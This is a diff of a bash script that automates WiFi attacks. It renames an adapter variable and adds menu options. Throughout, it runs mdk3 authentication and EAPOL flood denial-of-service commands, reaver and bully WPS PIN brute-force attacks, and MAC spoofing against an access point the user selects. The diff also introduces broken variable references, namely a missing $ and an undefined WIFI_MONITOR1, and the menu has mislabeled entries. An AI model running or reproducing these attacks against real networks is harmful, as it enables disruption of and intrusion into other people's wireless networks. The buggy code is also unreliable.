@@ -887,7 +887,7 @@ clear
 declare BSSID;
 declare ESSID;
 declare CHANNEL;
-declare ADAPTER1;
+declare WIFI_MONITOR;
 declare ADAPTER2;
 declare ADAPTER3;
 declare ADAPTER4;
@@ -901,12 +901,12 @@ sudo rfkill unblock all
 
 enable_mon_mode_1()
 {
-echo "Enabling Monitor Mode on $ADAPTER1"
-sudo ifconfig $ADAPTER1 down
+echo "Enabling Monitor Mode on $WIFI_MONITOR"
+sudo ifconfig $WIFI_MONITOR down
 sleep 1
-sudo iwconfig $ADAPTER1 mode monitor
+sudo iwconfig $WIFI_MONITOR mode monitor
 sleep 1
-sudo ifconfig $ADAPTER1 up
+sudo ifconfig $WIFI_MONITOR up
 echo "Monitor Mode Enabled"
 }
 
@@ -960,12 +960,12 @@ echo "Monitor Mode Enabled"
 
 mac_change_1()
 {
-echo "Setting the MAC Address on $ADAPTER1"
-sudo ifconfig $ADAPTER1 down
+echo "Setting the MAC Address on $WIFI_MONITOR"
+sudo ifconfig $WIFI_MONITOR down
 sleep 3
-macchanger $ADAPTER1 -m 02:22:88:29:EC:6F
+macchanger $WIFI_MONITOR -m 02:22:88:29:EC:6F
 sleep 3
-sudo ifconfig $ADAPTER1 up
+sudo ifconfig $WIFI_MONITOR up
 echo "MAC Changed"
 }
 
@@ -1021,37 +1021,40 @@ echo "MAC Changed"
 scan_for_targets()
 {
 
-sudo ifconfig $ADAPTER1 down
-sudo iwconfig $ADAPTER1 mode managed
-sudo ifconfig $ADAPTER1 up
+sudo ifconfig $WIFI_MONITOR down
+sudo iwconfig $WIFI_MONITOR mode managed
+sudo ifconfig $WIFI_MONITOR up
 
-eval $(sudo iwlist $ADAPTER1 scan | awk '/Address|ESSID|Channel:/' | sed 's/"//g' | sed 's/          Cell 01 - Address: /BSSID1=/g' | sed 's/          Cell 02 - Address: /BSSID2=/g' | sed 's/          Cell 03 - Address: /BSSID3=/g' | sed 's/          Cell 04 - Address: /BSSID4=/g' | sed 's/          Cell 05 - Address: /BSSID5=/g' | sed 's/          Cell 06 - Address: /BSSID6=/g' | sed 's/          Cell 07 - Address: /BSSID7=/g' | sed 's/          Cell 08 - Address: /BSSID8=/g' | sed 's/          Cell 09 - Address: /BSSID9=/g' | sed 's/          Cell 10 - Address: /BSSID10=/g' | sed 's/          Cell 11 - Address: /BSSID11=/g' | sed 's/          Cell 12 - Address: /BSSID12=/g' | sed 's/          Cell 13 - Address: /BSSID13=/g' | sed 's/          Cell 14 - Address: /BSSID14=/g' | sed 's/          Cell 15 - Address: /BSSID15=/g' | sed 's/          Cell 16 - Address: /BSSID16=/g' | sed 's/          Cell 17 - Address: /BSSID17=/g' | sed 's/          Cell 18 - Address: /BSSID18=/g' | sed 's/          Cell 19 - Address: /BSSID19=/g' | sed 's/          Cell 20 - Address: /BSSID20=/g'  | sed '2s/                    Channel:/CHANNEL1=/g' | sed '5s/                    Channel:/CHANNEL2=/g' | sed '8s/                    Channel:/CHANNEL3=/g' | sed '11s/                    Channel:/CHANNEL4=/g' | sed '14s/                    Channel:/CHANNEL5=/g' | sed '17s/                    Channel:/CHANNEL6=/g' | sed '20s/                    Channel:/CHANNEL7=/g' | sed '23s/                    Channel:/CHANNEL8=/g' | sed '26s/                    Channel:/CHANNEL9=/g' | sed '29s/                    Channel:/CHANNEL10=/g' | sed '32s/                    Channel:/CHANNEL11=/g' |sed '35s/                    Channel:/CHANNEL12=/g' | sed '38s/                    Channel:/CHANNEL13=/g' | sed '41s/                    Channel:/CHANNEL14=/g' | sed '44s/                    Channel:/CHANNEL15=/g' | sed '47s/                    Channel:/CHANNEL16=/g' | sed '50s/                    Channel:/CHANNEL17=/g' | sed '53s/                    Channel:/CHANNEL18=/g' | sed '56s/                    Channel:/CHANNEL19=/g' | sed '59s/                    Channel:/CHANNEL20=/g' | sed '3s/                    ESSID:/ESSID1=/g' | sed '6s/                    ESSID:/ESSID2=/g' | sed '9s/                    ESSID:/ESSID3=/g' | sed '12s/                    ESSID:/ESSID4=/g' | sed '15s/                    ESSID:/ESSID5=/g' | sed '18s/                    ESSID:/ESSID6=/g' | sed '21s/                    ESSID:/ESSID7=/g' | sed '24s/                    ESSID:/ESSID8=/g' | sed '27s/                    ESSID:/ESSID9=/g' | sed '30s/                    ESSID:/ESSID10=/g' | sed '33s/                    ESSID:/ESSID11=/g' | sed '36s/                    ESSID:/ESSID12=/g' | sed '39s/                    ESSID:/ESSID13=/g' | sed '42s/                    ESSID:/ESSID14=/g' | sed '45s/                    ESSID:/ESSID15=/g' | sed '48s/                    ESSID:/ESSID16=/g' | sed '51s/                    ESSID:/ESSID17=/g' | sed '54s/                    ESSID:/ESSID18=/g' | sed '57s/                    ESSID:/ESSID19=/g' | sed '60s/                    ESSID:/ESSID20=/g')
+eval $(sudo iwlist $WIFI_MONITOR scan | awk '/Address|ESSID|Channel:/' | sed 's/"//g' | sed 's/          Cell 01 - Address: /BSSID1=/g' | sed 's/          Cell 02 - Address: /BSSID2=/g' | sed 's/          Cell 03 - Address: /BSSID3=/g' | sed 's/          Cell 04 - Address: /BSSID4=/g' | sed 's/          Cell 05 - Address: /BSSID5=/g' | sed 's/          Cell 06 - Address: /BSSID6=/g' | sed 's/          Cell 07 - Address: /BSSID7=/g' | sed 's/          Cell 08 - Address: /BSSID8=/g' | sed 's/          Cell 09 - Address: /BSSID9=/g' | sed 's/          Cell 10 - Address: /BSSID10=/g' | sed 's/          Cell 11 - Address: /BSSID11=/g' | sed 's/          Cell 12 - Address: /BSSID12=/g' | sed 's/          Cell 13 - Address: /BSSID13=/g' | sed 's/          Cell 14 - Address: /BSSID14=/g' | sed 's/          Cell 15 - Address: /BSSID15=/g' | sed 's/          Cell 16 - Address: /BSSID16=/g' | sed 's/          Cell 17 - Address: /BSSID17=/g' | sed 's/          Cell 18 - Address: /BSSID18=/g' | sed 's/          Cell 19 - Address: /BSSID19=/g' | sed 's/          Cell 20 - Address: /BSSID20=/g'  | sed '2s/                    Channel:/CHANNEL1=/g' | sed '5s/                    Channel:/CHANNEL2=/g' | sed '8s/                    Channel:/CHANNEL3=/g' | sed '11s/                    Channel:/CHANNEL4=/g' | sed '14s/                    Channel:/CHANNEL5=/g' | sed '17s/                    Channel:/CHANNEL6=/g' | sed '20s/                    Channel:/CHANNEL7=/g' | sed '23s/                    Channel:/CHANNEL8=/g' | sed '26s/                    Channel:/CHANNEL9=/g' | sed '29s/                    Channel:/CHANNEL10=/g' | sed '32s/                    Channel:/CHANNEL11=/g' |sed '35s/                    Channel:/CHANNEL12=/g' | sed '38s/                    Channel:/CHANNEL13=/g' | sed '41s/                    Channel:/CHANNEL14=/g' | sed '44s/                    Channel:/CHANNEL15=/g' | sed '47s/                    Channel:/CHANNEL16=/g' | sed '50s/                    Channel:/CHANNEL17=/g' | sed '53s/                    Channel:/CHANNEL18=/g' | sed '56s/                    Channel:/CHANNEL19=/g' | sed '59s/                    Channel:/CHANNEL20=/g' | sed '3s/                    ESSID:/ESSID1=/g' | sed '6s/                    ESSID:/ESSID2=/g' | sed '9s/                    ESSID:/ESSID3=/g' | sed '12s/                    ESSID:/ESSID4=/g' | sed '15s/                    ESSID:/ESSID5=/g' | sed '18s/                    ESSID:/ESSID6=/g' | sed '21s/                    ESSID:/ESSID7=/g' | sed '24s/                    ESSID:/ESSID8=/g' | sed '27s/                    ESSID:/ESSID9=/g' | sed '30s/                    ESSID:/ESSID10=/g' | sed '33s/                    ESSID:/ESSID11=/g' | sed '36s/                    ESSID:/ESSID12=/g' | sed '39s/                    ESSID:/ESSID13=/g' | sed '42s/                    ESSID:/ESSID14=/g' | sed '45s/                    ESSID:/ESSID15=/g' | sed '48s/                    ESSID:/ESSID16=/g' | sed '51s/                    ESSID:/ESSID17=/g' | sed '54s/                    ESSID:/ESSID18=/g' | sed '57s/                    ESSID:/ESSID19=/g' | sed '60s/                    ESSID:/ESSID20=/g')
 
 conditional_clear
 mostrarheader
 
 echo "Select your wlan"
-		echo "                                       "
-		echo -e "      "$blue"1)"$transparent" $ESSID1"
-		echo -e "      "$blue"2)"$transparent" $ESSID2"
-		echo -e "      "$blue"3)"$transparent" $ESSID3"
-		echo -e "      "$blue"4)"$transparent" $ESSID4"
-		echo -e "      "$blue"5)"$transparent" $ESSID5"
-		echo -e "      "$blue"6)"$transparent" $ESSID6"
-		echo -e "      "$blue"7)"$transparent" $ESSID7"
-		echo -e "      "$blue"8)"$transparent" $ESSID9"
-		echo -e "      "$blue"9)"$transparent" $ESSID10"
-		echo -e "      "$blue"10)"$transparent" $ESSID11"
-		echo -e "      "$blue"11)"$transparent" $ESSID11"
-		echo -e "      "$blue"12)"$transparent" $ESSID12"
-		echo -e "      "$blue"13)"$transparent" $ESSID13"
-		echo -e "      "$blue"14)"$transparent" $ESSID14"
-		echo -e "      "$blue"15)"$transparent" $ESSID15"
-		echo -e "      "$blue"16)"$transparent" $ESSID16"
-		echo -e "      "$blue"17)"$transparent" $ESSID17"
-		echo -e "      "$blue"18)"$transparent" $ESSID18"
-		echo -e "      "$blue"19)"$transparent" $ESSID19"
-		echo -e "      "$blue"20)"$transparent" $ESSID20"
+echo ""
+echo -e ""$blue"0)"$transparent" Rescan"
+echo -e ""$blue"1)"$transparent" $ESSID1"
+echo -e ""$blue"2)"$transparent" $ESSID2"
+echo -e ""$blue"3)"$transparent" $ESSID3"
+echo -e ""$blue"4)"$transparent" $ESSID4"
+echo -e ""$blue"5)"$transparent" $ESSID5"
+echo -e ""$blue"6)"$transparent" $ESSID6"
+echo -e ""$blue"7)"$transparent" $ESSID7"
+echo -e ""$blue"8)"$transparent" $ESSID9"
+echo -e ""$blue"9)"$transparent" $ESSID10"
+echo -e ""$blue"10)"$transparent" $ESSID11"
+echo -e ""$blue"11)"$transparent" $ESSID11"
+echo -e ""$blue"12)"$transparent" $ESSID12"
+echo -e ""$blue"13)"$transparent" $ESSID13"
+echo -e ""$blue"14)"$transparent" $ESSID14"
+echo -e ""$blue"15)"$transparent" $ESSID15"
+echo -e ""$blue"16)"$transparent" $ESSID16"
+echo -e ""$blue"17)"$transparent" $ESSID17"
+echo -e ""$blue"18)"$transparent" $ESSID18"
+echo -e ""$blue"19)"$transparent" $ESSID19"
+echo -e ""$blue"20)"$transparent" $ESSID20"
+echo -e ""$blue"21)"$transparent"EXIT"
+echo -e ""
 
 
 read a
@@ -1060,6 +1063,10 @@ case $a in
 	0) 
 clear
 scan_for_targets
+;;
+   21)
+clear
+exitmode
 ;;
 	1)
 BSSID=$BSSID1
@@ -1174,52 +1181,52 @@ esac
 
 run_mdk3_ASOC1()
 {
-	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m"
+	xterm -e "timeout 60 mdk3 WIFI_MONITOR a -a $BSSID -m"
 }
 
 run_mdk3_EAPOL1()
 {
-	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250"
+	xterm -e "timeout 20s mdk3 $WIFI_MONITOR1 x 0 -t $BSSID -n $ESSID -s 250"
 }
 
 run_mdk3_ASOC2()
 {
-	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m"
+	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m"
 }
 
 run_mdk3_EAPOL2()
 {
-	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250"
+	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250"
 }
 
 run_mdk3_ASOC3()
 {
-	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m"
+	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m"
 }
 
 run_mdk3_EAPOL3()
 {
-	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250"
+	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250"
 }
 
 run_mdk3_ASOC4()
 {
-	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m"
+	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m"
 }
 
 run_mdk3_EAPOL4()
 {
-	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250"
+	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250"
 }
 
 run_mdk3_ASOC5()
 {
-	xterm -e "timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m"
+	xterm -e "timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m"
 }
 
 run_mdk3_EAPOL5()
 {
-	xterm -e "timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250"
+	xterm -e "timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250"
 }
 
 ##################################End Of Functions For MDK3 ########################################
@@ -1241,7 +1248,7 @@ case $a in
 	1)
 clear
 echo 
-read -p " - What is the name of your Wlan Adapter (Ex:wlan0) - ": ADAPTER1;
+read -p " - What is the name of your Wlan Adapter (Ex:wlan0) - ": WIFI_MONITOR;
 
 clear
 
@@ -1319,27 +1326,27 @@ menu
 ;;
 	1)
 clear
-timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250
+timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
 clear
-timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m
+timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m
 menu
 ;;
 	3)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv
 menu
 ;;
 	4)
 clear
-xterm -e "wash -i $ADAPTER1" & 
+xterm -e "wash -i $WIFI_MONITOR" & 
 menu
 ;;
 	5)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -1353,7 +1360,7 @@ menu
 ;;
 	6)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -1367,12 +1374,12 @@ menu
 ;;
 	7)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR
 menu
 ;;
 	8)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR | tee BullyOutput.txt &
 bully_pid=$! 
 
 while kill -0 $bully_pid ; do
@@ -1386,7 +1393,7 @@ menu
 ;;
 	9)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR | tee BullyOutput.txt &
 bully_pid=$! 
 
 while kill -0 $bully_pid ; do
@@ -1413,7 +1420,7 @@ clear
 conditional_clear
 mostrarheader
 echo 
-read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
+read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR;
 clear
 echo 
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
@@ -1484,27 +1491,27 @@ menu
 ;;
 	1)
 clear
-timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250
+timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
 clear
-timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m
+timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m
 menu
 ;;
 	3)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv
 menu
 ;;
 	4)
 clear
-xterm -e "wash -i $ADAPTER1" & 
+xterm -e "wash -i $WIFI_MONITOR" & 
 menu
 ;;
 	5)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -1518,7 +1525,7 @@ menu
 ;;
 	6)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -1532,12 +1539,12 @@ menu
 ;;
 	7)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR
 menu
 ;;
 	8)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR | tee BullyOutput.txt &
 bully_pid=$! 
 
 while kill -0 $bully_pid ; do
@@ -1551,7 +1558,7 @@ menu
 ;;
 	9)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR | tee BullyOutput.txt &
 bully_pid=$! 
 
 while kill -0 $bully_pid ; do
@@ -1577,7 +1584,7 @@ mostrarheader
 	3)
 clear
 echo 
-read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
+read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR;
 clear
 echo 
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
@@ -1658,27 +1665,27 @@ menu
 ;;
 	1)
 clear
-timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250
+timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
 clear
-timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m
+timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m
 menu
 ;;
 	3)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv
 menu
 ;;
 	4)
 clear
-xterm -e "wash -i $ADAPTER1" & 
+xterm -e "wash -i $WIFI_MONITOR" & 
 menu
 ;;
 	5)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -1692,7 +1699,7 @@ menu
 ;;
 	6)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -1706,12 +1713,12 @@ menu
 ;;
 	7)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR
 menu
 ;;
 	8)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR | tee BullyOutput.txt &
 bully_pid=$! 
 
 while kill -0 $bully_pid ; do
@@ -1725,7 +1732,7 @@ menu
 ;;
 	9)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR | tee BullyOutput.txt &
 bully_pid=$! 
 
 while kill -0 $bully_pid ; do
@@ -1749,7 +1756,7 @@ menu
 	4)
 clear
 echo 
-read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
+read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR;
 clear
 echo 
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
@@ -1834,27 +1841,27 @@ menu
 ;;
 	1)
 clear
-timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250
+timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
 clear
-timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m
+timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m
 menu
 ;;
 	3)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv
 menu
 ;;
 	4)
 clear
-xterm -e "wash -i $ADAPTER1" & 
+xterm -e "wash -i $WIFI_MONITOR" & 
 menu
 ;;
 	5)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -1868,7 +1875,7 @@ menu
 ;;
 	6)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv | tee ReaverOutput.txt &
 reaver_pid=$! 
 
 while kill -0 $reaver_pid ; do
@@ -1882,12 +1889,12 @@ menu
 ;;
 	7)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR
 menu
 ;;
 	8)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR | tee BullyOutput.txt &
 bully_pid=$! 
 
 while kill -0 $bully_pid ; do
@@ -1901,7 +1908,7 @@ menu
 ;;
 	9)
 clear
-bully -b $BSSID -c $CHANNEL $ADAPTER1 | tee BullyOutput.txt &
+bully -b $BSSID -c $CHANNEL $WIFI_MONITOR | tee BullyOutput.txt &
 bully_pid=$! 
 
 while kill -0 $bully_pid ; do
@@ -1925,7 +1932,7 @@ menu
 	5)
 clear
 echo 
-read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": ADAPTER1;
+read -p " - What is the name of your 1st Wlan Adapter (Ex:Wlan0) - ": WIFI_MONITOR;
 clear
 echo 
 read -p " - What is the name of your 2nd Wlan Adapter (Ex:Wlan1) - ": ADAPTER2;
@@ -2015,27 +2022,27 @@ menu
 ;;
 	1)
 clear
-timeout 20s mdk3 $ADAPTER1 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250
+timeout 20s mdk3 $WIFI_MONITOR x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER2 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER3 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER4 x 0 -t $BSSID -n $ESSID -s 250 & timeout 20s mdk3 $ADAPTER5 x 0 -t $BSSID -n $ESSID -s 250
 menu
 ;;
 	2)
 clear
-timeout 60 mdk3 $ADAPTER1 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m
+timeout 60 mdk3 $WIFI_MONITOR a -a $BSSID -m & timeout 60 mdk3 $ADAPTER2 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER3 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER4 a -a $BSSID -m & timeout 60 mdk3 $ADAPTER5 a -a $BSSID -m
 menu
 ;;
 	3)
 clear
-reaver -i $ADAPTER1 -b $BSSID -c $CHANNEL -vv
+reaver -i $WIFI_MONITOR -b $BSSID -c $CHANNEL -vv
 menu
 ;;
 	4)
 clear
-xterm -e "wash -i $ADAPTER1" & 
